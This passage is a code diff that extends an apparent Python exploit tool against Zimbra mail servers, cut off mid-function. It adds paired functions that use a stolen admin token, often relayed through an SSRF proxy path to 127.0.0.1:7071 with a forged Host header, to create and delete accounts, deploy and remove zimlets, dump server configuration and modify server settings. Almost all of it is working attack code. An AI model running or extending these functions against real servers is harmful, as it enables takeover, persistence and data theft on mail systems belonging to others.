@@ -5,6 +5,7 @@ import re
 from requests_toolbelt import MultipartEncoder
 import warnings
 warnings.filterwarnings("ignore")
+from datetime import datetime
 
 def auth_request_low(uri,username,password):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -118,7 +119,459 @@ def lowtoken_to_admintoken_by_SSRF(uri,username,password):
     except Exception as e:
         print("[!] Error:%s"%(e))
         exit(0)
-  
+ 
+def createaccount_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <CreateAccountRequest xmlns="urn:zimbraAdmin">
+          <name>{user}</name>
+          <password>{password}</password>
+         </CreateAccountRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the user :")
+    print("    Eg.:test1@test.com")   
+    user = input("[>]: ")
+    print("[*] Input the password :")   
+    password = input("[>]: ")
+
+    try:
+        print("[*] Try to createaccount")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,user=user,password=password),verify=False,timeout=15)
+        if "email address already exists" in r.text:
+            print("[-] Account already exists,try another username.")
+        elif "invalid password" in r.text:
+            print("[-] Try hard password.")
+        elif "id=" in r.text:
+            print("[+] Success")
+            pattern_id = re.compile(r"id=\"(.*?)\"")
+            accountid = pattern_id.findall(r.text)[0] 
+            print("    AccountId: %s"%(accountid))             
+        else:
+          print("[!]")
+          print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))        
+
+def createaccount_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <CreateAccountRequest xmlns="urn:zimbraAdmin">
+          <name>{user}</name>
+          <password>{password}</password>
+         </CreateAccountRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the user :")
+    print("    Eg.:test1@test.com")   
+    user = input("[>]: ")
+    print("[*] Input the password :")   
+    password = input("[>]: ")
+
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to createaccount")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,user=user,password=password),headers=headers,verify=False,timeout=15)
+        if "email address already exists" in r.text:
+            print("[-] Account already exists,try another username.")
+        elif "invalid password" in r.text:
+            print("[-] Try hard password.")
+        elif "id=" in r.text:
+            print("[+] Success")
+            pattern_id = re.compile(r"id=\"(.*?)\"")
+            accountid = pattern_id.findall(r.text)[0] 
+            print("    AccountId: %s"%(accountid))             
+        else:
+          print("[!]")
+          print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))        
+
+def deleteaccount_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <DeleteAccountRequest xmlns="urn:zimbraAdmin">
+          <id>{id}</id>
+         </DeleteAccountRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the AccountId :")
+    id = input("[>]: ")
+
+    try:
+        print("[*] Try to deleteaccount")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,id=id),verify=False,timeout=15)
+        print("    ok")
+        print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def deleteaccount_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <DeleteAccountRequest xmlns="urn:zimbraAdmin">
+          <id>{id}</id>
+         </DeleteAccountRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the AccountId :")
+    id = input("[>]: ")
+
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to deleteaccount")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,id=id),headers=headers,verify=False,timeout=15)
+        print("    ok")
+        print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def deployzimlet_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <DeployZimletRequest xmlns="urn:zimbraAdmin" action="deployAll" flush="true">
+          <content>
+            <aid>{id}</aid>
+          </content> 
+         </DeployZimletRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the attachment id :") 
+    id = input("[>]: ")
+    try:
+        print("[*] Try to deployzimlet")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,id=id),verify=False,timeout=15)
+        if "succeeded" in r.text:           
+            print("[+] Success")             
+        else:
+          print("[!]")
+          print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def deployzimlet_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <DeployZimletRequest xmlns="urn:zimbraAdmin" action="deployAll" flush="true">
+          <content>
+            <aid>{id}</aid>
+          </content> 
+         </DeployZimletRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the attachment id :") 
+    id = input("[>]: ")
+
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to deployzimlet")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,id=id),headers=headers,verify=False,timeout=15)
+        if "succeeded" in r.text:           
+            print("[+] Success")             
+        else:
+          print("[!]")
+          print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def undeployzimlet_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <UndeployZimletRequest xmlns="urn:zimbraAdmin">
+          <name>{name}</name>
+         </UndeployZimletRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the name :") 
+    name = input("[>]: ")
+    try:
+        print("[*] Try to undeployzimlet")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,name=name),verify=False,timeout=15)
+        print("    ok")
+        print(r.text)        
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def undeployzimlet_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <UndeployZimletRequest xmlns="urn:zimbraAdmin">
+          <name>{name}</name>
+         </UndeployZimletRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the name :") 
+    name = input("[>]: ")
+
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"   
+    try:
+        print("[*] Try to undeployzimlet")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,name=name),headers=headers,verify=False,timeout=15)
+        print("    ok")
+        print(r.text)        
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def deletezimlet_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <DeleteZimletRequest xmlns="urn:zimbraAdmin">
+          <zimlet>
+            <name>{name}</name>
+          </zimlet> 
+         </DeleteZimletRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the name :") 
+    name = input("[>]: ")
+    try:
+        print("[*] Try to deletezimlet")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,name=name),verify=False,timeout=15)
+        print("    ok")
+        print(r.text)        
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def deletezimlet_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <DeleteZimletRequest xmlns="urn:zimbraAdmin">
+          <zimlet>
+            <name>{name}</name>
+          </zimlet> 
+         </DeleteZimletRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the name :") 
+    name = input("[>]: ")
+
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to deletezimlet")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,name=name),headers=headers,verify=False,timeout=15)
+        print("    ok")
+        print(r.text)        
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def getallzimlet_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetAllZimletsRequest xmlns="urn:zimbraAdmin">
+         </GetAllZimletsRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    try:
+        print("[*] Try to getallzimlet")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
+        print("[*] Try to save the response")        
+        with open("getallzimlet.xml", 'w+', encoding='utf-8') as file_object:
+            file_object.write(r.text)
+        print("[*] Save as getallzimlet.xml")       
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def getallzimlet_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetAllZimletsRequest xmlns="urn:zimbraAdmin">
+         </GetAllZimletsRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to getallzimlet")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
+        print("[*] Try to save the response")        
+        with open("getallzimlet.xml", 'w+', encoding='utf-8') as file_object:
+            file_object.write(r.text)
+        print("[*] Save as getallzimlet.xml")       
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def getaccount_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetAccountRequest xmlns="urn:zimbraAdmin">
+          <account by="name">{mail}</account> 
+         </GetAccountRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the user :")
+    print("    Eg.:test1@test.com")   
+    mail = input("[>]: ")
+
+    try:
+        print("[*] Try to getaccount")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,mail=mail),verify=False,timeout=15)
+        if "id" in r.text:
+            pattern_id = re.compile(r"id=\"(.*?)\"")
+            accountid = pattern_id.findall(r.text)[0] 
+            print("    AccountId: %s"%(accountid))             
+        else:
+          print("[!]")
+          print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def getaccount_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetAccountRequest xmlns="urn:zimbraAdmin">
+          <account by="name">{mail}</account> 
+         </GetAccountRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the user :")
+    print("    Eg.:test1@test.com")   
+    mail = input("[>]: ")
+
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to getaccount")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,mail=mail),headers=headers,verify=False,timeout=15)
+        if "id" in r.text:
+            pattern_id = re.compile(r"id=\"(.*?)\"")
+            accountid = pattern_id.findall(r.text)[0] 
+            print("    AccountId: %s"%(accountid))             
+        else:
+          print("[!]")
+          print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
 def getalldomains_request(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
@@ -203,7 +656,6 @@ def getallaccounts_request(uri,token):
           print("[+] Name:%s,Id:%s"%(name[i],accountId[i]))
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getallaccounts_requestSSRF(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -235,7 +687,6 @@ def getallaccounts_requestSSRF(uri,token):
           print("[+] Name:%s,Id:%s"%(name[i],accountId[i]))
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getalladminaccounts_request(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -261,7 +712,6 @@ def getalladminaccounts_request(uri,token):
           print("[+] Admin name:%s,Id:%s"%(name[i],accountId[i]))
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getalladminaccounts_requestSSRF(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -293,7 +743,6 @@ def getalladminaccounts_requestSSRF(uri,token):
           print("[+] Admin name:%s,Id:%s"%(name[i],accountId[i]))
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getallmailboxes_request(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -318,7 +767,6 @@ def getallmailboxes_request(uri,token):
 
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getallmailboxes_requestSSRF(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -349,7 +797,6 @@ def getallmailboxes_requestSSRF(uri,token):
 
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getmailbox_request(uri,token,id):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -373,7 +820,136 @@ def getmailbox_request(uri,token,id):
         print(r.text)
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
+
+def getserver_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetServerRequest xmlns="urn:zimbraAdmin">
+          <server by="serviceHostname">{serviceHostname}</server>
+         </GetServerRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    print("[*] Input the serviceHostname:")
+    serviceHostname = input("[>]: ")
+    try:
+        print("[*] Try to get server config")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,serviceHostname=serviceHostname),verify=False,timeout=15)
+        if "zimbraId" in r.text:
+          pattern_data = re.compile(r"zimbraId\">(.*?)</a")        
+          zimbraId = pattern_data.findall(r.text)[0]
+          print("    zimbraId:"+zimbraId)
+          return zimbraId
+        else:
+          print("[!]")
+          print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def getserver_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetServerRequest xmlns="urn:zimbraAdmin">
+          <server by="serviceHostname">{serviceHostname}</server>
+         </GetServerRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    print("[*] Input the serviceHostname:")
+    serviceHostname = input("[>]: ")
+
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to get server config")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,serviceHostname=serviceHostname),headers=headers,verify=False,timeout=15)
+        if "zimbraId" in r.text:
+          pattern_data = re.compile(r"zimbraId\">(.*?)</a")        
+          zimbraId = pattern_data.findall(r.text)[0]
+          print("    zimbraId:"+zimbraId)
+          return zimbraId
+        else:
+          print("[!]")
+          print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def getservernifs_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetServerNIfsRequest xmlns="urn:zimbraAdmin">
+         <server by="serviceHostname">{serviceHostname}</server>
+         </GetServerNIfsRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    print("[*] Input the serviceHostname:")
+    serviceHostname = input("[>]: ")    
+
+    try:
+        print("[*] Try to get Network Interface information for a server")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,serviceHostname=serviceHostname),verify=False,timeout=15)       
+
+        print("[*] Try to save the response")        
+        with open("GetServerNIfs.xml", 'w+', encoding='utf-8') as file_object:
+            file_object.write(r.text)
+        print("[*] Save as GetServerNIfs.xml")
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def getservernifs_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetServerNIfsRequest xmlns="urn:zimbraAdmin">
+         <server by="serviceHostname">{serviceHostname}</server>
+         </GetServerNIfsRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    print("[*] Input the serviceHostname:")
+    serviceHostname = input("[>]: ")
+
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to get Network Interface information for a server")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,serviceHostname=serviceHostname),headers=headers,verify=False,timeout=15)       
+
+        print("[*] Try to save the response")        
+        with open("GetServerNIfs.xml", 'w+', encoding='utf-8') as file_object:
+            file_object.write(r.text)
+        print("[*] Save as GetServerNIfs.xml")
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
 
 def getmemcachedconfig_request(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -400,7 +976,6 @@ def getmemcachedconfig_request(uri,token):
           print(r.text)
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getmemcachedconfig_requestSSRF(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -432,8 +1007,315 @@ def getmemcachedconfig_requestSSRF(uri,token):
           print("[!]")
           print(r.text)
     except Exception as e:
+        print("[!] Error:%s"%(e))       
+
+def getallconfig_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>         
+         <GetAllConfigRequest xmlns="urn:zimbraAdmin">
+         </GetAllConfigRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+ 
+    try:
+        print("[*] Try to getallconfig")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
+        print("[*] Try to save the response")        
+        with open("getallconfig.xml", 'w+', encoding='utf-8') as file_object:
+            file_object.write(r.text)
+        print("[*] Save as getallconfig.xml")
+    except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)       
+
+def getallconfig_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>         
+         <GetAllConfigRequest xmlns="urn:zimbraAdmin">
+         </GetAllConfigRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+    try:
+        print("[*] Try to getallconfig")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
+        print("[*] Try to save the response")        
+        with open("getallconfig.xml", 'w+', encoding='utf-8') as file_object:
+            file_object.write(r.text)
+        print("[*] Save as getallconfig.xml")
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def getservicestats_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetServiceStatusRequest xmlns="urn:zimbraAdmin">
+         </GetServiceStatusRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """  
+    try:
+        print("[*] Try to GetServiceStatusRequest")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)       
+        if "time" in r.text:
+            pattern_server = re.compile(r"server=\"(.*?)\"")
+            server = pattern_server.findall(r.text)[0]
+            pattern_config = re.compile(r"t=\"(.*?)\"")
+            config = pattern_config.findall(r.text)[0]            
+            print("[+] Server: "+server)
+            print("[+] Start time: "+str(datetime.fromtimestamp(int(config))))
+
+        print("[*] Try to save the response")        
+        with open("getservicestats.xml", 'w+', encoding='utf-8') as file_object:
+            file_object.write(r.text)
+        print("[*] Save as getservicestats.xml")
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def getservicestats_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetServiceStatusRequest xmlns="urn:zimbraAdmin">
+         </GetServiceStatusRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to GetServiceStatusRequest")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)       
+        if "time" in r.text:
+            pattern_server = re.compile(r"server=\"(.*?)\"")
+            server = pattern_server.findall(r.text)[0]
+            pattern_config = re.compile(r"t=\"(.*?)\"")
+            config = pattern_config.findall(r.text)[0]            
+            print("[+] Server: "+server)
+            print("[+] Start time: "+str(datetime.fromtimestamp(int(config))))
+
+        print("[*] Try to save the response")        
+        with open("getservicestats.xml", 'w+', encoding='utf-8') as file_object:
+            file_object.write(r.text)
+        print("[*] Save as getservicestats.xml")
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def modifyconfig_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>         
+         <ModifyConfigRequest xmlns="urn:zimbraAdmin">
+          
+          <a n="{name}">{value}</a>
+         </ModifyConfigRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the name :")
+    name = input("[>]: ")
+
+    print("[*] Input the value :")
+    value = input("[>]: ")
+
+    try:
+        print("[*] Try to modifyconfig")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,name=name,value=value),verify=False,timeout=15)
+        print("    ok")
+        print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def modifyconfig_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>         
+         <ModifyConfigRequest xmlns="urn:zimbraAdmin">
+          
+          <a n="{name}">{value}</a>
+         </ModifyConfigRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+
+    print("[*] Input the name :")
+    name = input("[>]: ")
+
+    print("[*] Input the value :")
+    value = input("[>]: ")
+
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to modifyconfig")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,name=name,value=value),headers=headers,verify=False,timeout=15)
+        print("    ok")
+        print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def modifyserver_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>         
+         <ModifyServerRequest xmlns="urn:zimbraAdmin">
+          <id>{id}</id>  
+          <a n="{name}">{value}</a>
+         </ModifyServerRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    print("[*] Input the zimbraId:")
+    id = input("[>]: ")
+
+    print("[*] Input the name :")
+    name = input("[>]: ")
+
+    print("[*] Input the value :")
+    value = input("[>]: ")
+
+    try:
+        print("[*] Try to modifyserver")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,id=id,name=name,value=value),verify=False,timeout=15)
+        print("[*] Try to save the response")        
+        with open("modifyserver.xml", 'w+', encoding='utf-8') as file_object:
+            file_object.write(r.text)
+        print("[*] Save as modifyserver.xml")
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def modifyserver_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>         
+         <ModifyServerRequest xmlns="urn:zimbraAdmin">
+          <id>{id}</id>  
+          <a n="{name}">{value}</a>
+         </ModifyServerRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    print("[*] Input the zimbraId:")
+    id = input("[>]: ")
+
+    print("[*] Input the name :")
+    name = input("[>]: ")
+
+    print("[*] Input the value :")
+    value = input("[>]: ")
+
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to modifyserver")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,id=id,name=name,value=value),headers=headers,verify=False,timeout=15)
+        print("[*] Try to save the response")        
+        with open("modifyserver.xml", 'w+', encoding='utf-8') as file_object:
+            file_object.write(r.text)
+        print("[*] Save as modifyserver.xml")
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def reloadmemcachedconfig_request(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
